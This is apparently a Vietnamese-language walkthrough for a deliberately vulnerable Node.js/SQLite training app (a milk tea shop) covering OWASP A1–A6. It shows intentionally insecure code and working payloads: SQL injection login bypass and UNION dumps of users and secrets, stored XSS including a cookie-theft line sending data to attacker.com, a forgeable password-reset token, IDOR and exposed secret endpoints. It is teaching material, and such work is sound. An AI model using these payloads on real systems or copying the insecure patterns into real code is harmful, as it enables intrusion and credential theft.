# DVNA — Kịch bản khai thác lỗ hổng bảo mật

Ứng dụng: **Anson Milk Tea Shop** — Node.js/Express + SQLite3  
Mục đích: Minh hoạ OWASP Top 10 (A1–A6) trong môi trường thực tế

---

## Tài khoản test

| Username | Password  | Role  | Balance |
|----------|-----------|-------|---------|
| admin    | admin123  | admin | $99999  |
| user1    | password1 | user  | $1000   |
| user2    | password2 | user  | $500    |

---

## A1 — SQL Injection

### Điểm tấn công

**1. Login form** (`POST /login`) — `routes/auth.js:16`

```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, ...);
```

**2. Search bar (nav)** (`POST /user/search`) — `routes/user.js:214`

```js
const sql = `SELECT * FROM drinks WHERE name LIKE '%${q}%'`;
db.all(sql, []);
```

**3. Lab page** (`POST /vuln/sqli`) — `routes/vuln.js:23`

```js
const sql = `SELECT id, username, email, role, balance FROM users WHERE username LIKE '%${search}%'`;
db.all(sql, []);
```

### Cách thực hiện

#### Login bypass — truy cập admin không cần mật khẩu

Vào `/login`, nhập:
- **Username:** `admin'--`
- **Password:** _(bất kỳ)_

Query thực tế chạy ở backend:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```
Phần `--` comment out điều kiện password. SQLite trả về row của admin → session được tạo với `role = 'admin'`.

Sau khi login fail, trang hiển thị SQL query đang chạy — dùng để hiểu cấu trúc cần inject.

#### UNION dump toàn bộ users qua search bar

Vào bất kỳ trang nào có thanh search, nhập:
```
' UNION SELECT id,username,password,role,email,balance FROM users--
```

Query thực tế:
```sql
SELECT * FROM drinks WHERE name LIKE '%' UNION SELECT id,username,password,role,email,balance FROM users--%'
```

Bảng `drinks` có 6 cột (`id, name, price, category, image, stock`) — UNION cần đúng 6 cột. Kết quả trả về:
- Cột `name` → username của user
- Cột `price` → **password plaintext**
- Cột `category` → role
- Cột `image` → email
- Cột `stock` → balance

#### Boolean-based — lấy tất cả records

```
' OR '1'='1
```

Query thực tế (search bar):
```sql
SELECT * FROM drinks WHERE name LIKE '%' OR '1'='1%'
```
Điều kiện `'1'='1'` luôn đúng → trả về mọi row trong bảng.

## A2 — Broken Authentication & Session Management

### Điểm tấn công: `/vuln/auth` và `/login`

### Lỗ hổng 1 — Weak session secret

`server.js:18`:
```js
app.use(session({
  secret: 'devsecret',     // hardcoded, dễ brute-force
  cookie: { maxAge: 3600000, httpOnly: true }
  // secure không set → truyền qua HTTP (MITM)
}));
```

**Lưu ý:** Cookie được sign bằng `keygrip` library (không phải HMAC đơn giản). Việc forge cookie đòi hỏi hiểu rõ thuật toán signing của keygrip. Các attack vector thực tế hiệu quả hơn được liệt kê bên dưới.

### Lỗ hổng 2 — Brute force không bị chặn

`POST /vuln/auth/bruteforce` — không cần xác thực, không có rate limit:
```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, user) => {
  res.json({ success: !!user, query, message: ... });
});
```

Cách thực hiện: Vào `/vuln/auth` → dùng wordlist có sẵn → click lần lượt từng password → khi `success: true` là crack xong. Response trả về SQL query đang chạy để thấy rõ vấn đề.

### Lỗ hổng 3 — Forgot Password với token dự đoán được

`routes/auth.js` — `POST /forgot-password`, `GET/POST /reset-password`

```js
// Token = base64(username) — trivially reversible
const token = Buffer.from(username).toString('base64');
const resetLink = `/reset-password?token=${token}`;

// Reset: decode token, update password — không verify, không expiry
const username = Buffer.from(token, 'base64').toString('utf8');
db.run(`UPDATE users SET password = '${newPassword}' WHERE username = '${username}'`);
```

**Attack flow:**
1. Attacker biết username target là `admin`
2. Tự tính token: `btoa('admin')` = `YWRtaW4=` (chạy trong browser console)
3. Truy cập trực tiếp: `/reset-password?token=YWRtaW4=`
4. Nhập mật khẩu mới → admin bị đổi mật khẩu mà không cần email

**Các lỗ hổng:**
- Token = `base64(username)` → reversible, không random
- Không có expiry — token hợp lệ mãi mãi
- Không gửi email — link hiện thẳng trên màn hình
- User enumeration — thông báo "Username not found" lộ tài khoản tồn tại
- Không rate limiting — enumerate tất cả usernames

### Lỗ hổng 4 — Mật khẩu plaintext

`routes/auth.js:14-16`:
```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```
Mật khẩu được so sánh trực tiếp với giá trị lưu trong DB — không hash, không bcrypt.

### Cách thực hiện

1. **SQLi bypass (hiệu quả nhất):** Vào `/login` → Username: `admin'--` → Password: (bất kỳ) → Login thành công với quyền admin
2. **Brute force:** Vào `/vuln/auth` → dùng wordlist → click từng password → khi `success: true` là crack xong
3. **Forgot password token predictable:** Tính `base64('admin')` = `YWRtaW4=` → truy cập `/reset-password?token=YWRtaW4=` → đổi password admin

---

## A3 — Cross-Site Scripting (Stored XSS)

### Điểm tấn công

**Submit payload:** `POST /vuln/xss` — `routes/vuln.js:68-77`

```js
const sql = `INSERT INTO reviews (user_id, name, comment, rating, created_at)
             VALUES (${userId}, '${name}', '${comment}', 5, datetime('now'))`;
db.run(sql, (err) => { if (err) console.error(err); });
const output = `Thank you <strong>${name}</strong> for your review!<br><em>${comment}</em>`;
res.render('vuln/xss', { output, name, comment });
```

Comment được lưu thẳng vào DB không sanitize.

**Kích hoạt:** `GET /user/reviews` — `views/user/reviews.ejs`

```html
<%- r.comment %>   <!-- render raw HTML, không escape -->
```

### Cách thực hiện (2 bước — 2 user)

**Bước 1 — Attacker (user1) submit payload:**

Vào `/vuln/xss`, điền:
- Name: `user1`
- Review: `<script>alert(document.cookie)</script>`

Backend lưu vào bảng `reviews`:
```sql
INSERT INTO reviews (user_id, name, comment, ...) VALUES (2, 'user1', '<script>alert(document.cookie)</script>', 5, ...)
```

**Bước 2 — Victim (user2) vào trang Reviews:**

Vào `/user/reviews` (link trong nav). EJS render `<%-` thay vì `<%=` nên HTML không bị escape. Script thực thi trong trình duyệt của user2, lấy được `document.cookie` chứa session.

**Payload nâng cao — steal cookie sang server khác:**
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

---

## A4 — Insecure Direct Object Reference (IDOR)

### Điểm tấn công

**Lab page:** `GET /vuln/idor` — `routes/vuln.js:80-88` (hiển thị tất cả orders, click "View" đi đến `/user/order/:id`)

**Real app (IDOR thực sự):** `GET /user/order/:id` — `routes/user.js:122-133`

```js
db.get(
  `SELECT o.*, u.username AS owner_username FROM orders o
   JOIN users u ON o.user_id = u.id WHERE o.id = ?`,
  [req.params.id],   // không check ownership — IDOR
  ...
);
```

### Cách thực hiện

1. Login bằng **user1** → vào `/user/orders`
2. Click vào một đơn hàng → URL trở thành `/user/order/3` (ví dụ)
3. Đổi số `3` thành `1` trên URL → xem được đơn hàng của admin
4. Banner đỏ hiện ra: _"IDOR! Bạn đang xem đơn hàng của admin"_

Query chạy ở backend không có điều kiện `AND user_id = ?` nên trả về bất kỳ order nào theo ID.

Trên trang lab `/vuln/idor`: hiển thị tất cả orders của mọi user, có input để nhập Order ID bất kỳ.

---

## A5 — Security Misconfiguration

### Điểm tấn công: `GET /vuln/config`

`routes/vuln.js:92-105`:
```js
router.get('/config', requireAuth, (req, res) => {
  db.all('SELECT name, value FROM app_config', [], (err, configs) => {
    res.render('vuln/config', { configs: configs || [], responseHeaders });
  });
});
```

### Dữ liệu bị lộ

Bảng `app_config` được seed trong `server.js:114-121`:

```js
stmtInsertConfig.run('db_host',    'localhost');
stmtInsertConfig.run('db_user',    'root');
stmtInsertConfig.run('db_pass',    'password123');    // DB password
stmtInsertConfig.run('api_key',    'sk_live_secret_key_12345');  // API key
stmtInsertConfig.run('admin_email','admin@milktea.com');
stmtInsertConfig.run('debug_mode', 'true');
```

Endpoint `/vuln/config` chỉ cần đăng nhập (không cần admin) là truy cập được toàn bộ secrets.

Ngoài ra: session secret `devsecret` hardcode trong `server.js:18`, `debug_mode=true` lộ thông tin lỗi chi tiết.

### Public debug endpoint — lộ session secret

`GET /debug` — **không cần đăng nhập**, trả về:
```json
{
  "status": "ok",
  "session_secret": "devsecret",
  "db_path": "/app/data.db",
  "NODE_ENV": "production"
}
```

Lộ luôn cả `session_secret` và đường dẫn DB.

### SQL Injection vector — dump app_config qua search bar

Search bar (nav) tại `routes/user.js:214` — bảng `drinks` có 6 cột nên cần pad:

```
' UNION SELECT id,name,value,'x','x','x' FROM app_config--
```

Query thực tế:
```sql
SELECT * FROM drinks WHERE name LIKE '%' UNION SELECT id,name,value,'x','x','x' FROM app_config--%'
```

Trả về toàn bộ secrets (db_pass, api_key, debug_mode...) thay vì drinks.

---

## A6 — Sensitive Data Exposure

### Điểm tấn công 1 — API không bảo vệ password

**`GET /api/profile`** — `server.js:143-146`

```js
app.get('/api/profile', (req, res) => {
  dbconn.get('SELECT * FROM users WHERE id = ?', [req.session.userId], (err, user) => {
    res.json(user);   // trả về toàn bộ object kể cả password
  });
});
```

Response khi gọi từ DevTools Console:
```json
{
  "id": 2,
  "username": "user1",
  "password": "password1",
  "role": "user",
  "email": "user1@milktea.com",
  "balance": 1000
}
```

**`GET /api/users`** — `server.js:150-153` — **không cần đăng nhập**

```js
app.get('/api/users', (req, res) => {
  dbconn.all('SELECT * FROM users', [], (err, users) => {
    res.json(users);  // dump tất cả users + passwords, không cần auth
  });
});
```

### Điểm tấn công 2 — Giao diện admin lộ password

**`GET /vuln/data`** — `routes/vuln.js:108-113`

```js
db.all('SELECT id, username, password, email, role, balance FROM users', [], (err, users) => {
  res.render('vuln/data', { users: users || [] });
});
```

Render bảng kèm cột `password` plaintext.

### Cách thực hiện

**Cách 1 — DevTools:**
1. Đăng nhập → mở DevTools (F12) → tab Console
2. Chạy: `fetch('/api/profile').then(r=>r.json()).then(console.log)`
3. Xem password trong response

**Cách 2 — curl (không cần login):**
```bash
curl http://localhost:3000/api/users
```

**Cách 3 — Giao diện:**
Vào `/vuln/data` → thấy bảng toàn bộ users kèm password plaintext.

---

## Bảng tổng hợp

| ID | URL khai thác | Payload mẫu | Backend bị ảnh hưởng |
|----|--------------|-------------|----------------------|
| A1 | `/login` | `admin'--` | `routes/auth.js:14` |
| A1 | Nav search bar | `' UNION SELECT id,username,password,role,email,balance FROM users--` | `routes/user.js:214` |
| A1 | `/vuln/sqli` | `' OR '1'='1` | `routes/vuln.js:23` |
| A2 | `/vuln/auth/bruteforce` | Brute force wordlist | `routes/vuln.js:48-61` |
| A2 | `/login` | `admin'--` (bypass) | `routes/auth.js:14` |
| A2 | `/forgot-password` | `btoa('admin')` → forge reset link | `routes/auth.js` |
| A2 | `/reset-password?token=YWRtaW4=` | Đổi password admin không cần email | `routes/auth.js` |
| A3 | `/vuln/xss` → `/user/reviews` | `<script>alert(document.cookie)</script>` | `routes/vuln.js:68-77`, `views/user/reviews.ejs` |
| A4 | `/user/order/:id` | Đổi ID trên URL | `routes/user.js:122` |
| A5 | `/vuln/config` | _(chỉ cần đăng nhập)_ | `routes/vuln.js:92` |
| A5 | `/debug` | _(không cần login)_ | `server.js:143` |
| A6 | `/api/users` | `curl /api/users` | `server.js:150` |
| A6 | `/api/profile` | DevTools Console | `server.js:143` |
| A6 | `/vuln/data` | _(chỉ cần đăng nhập)_ | `routes/vuln.js:108` |
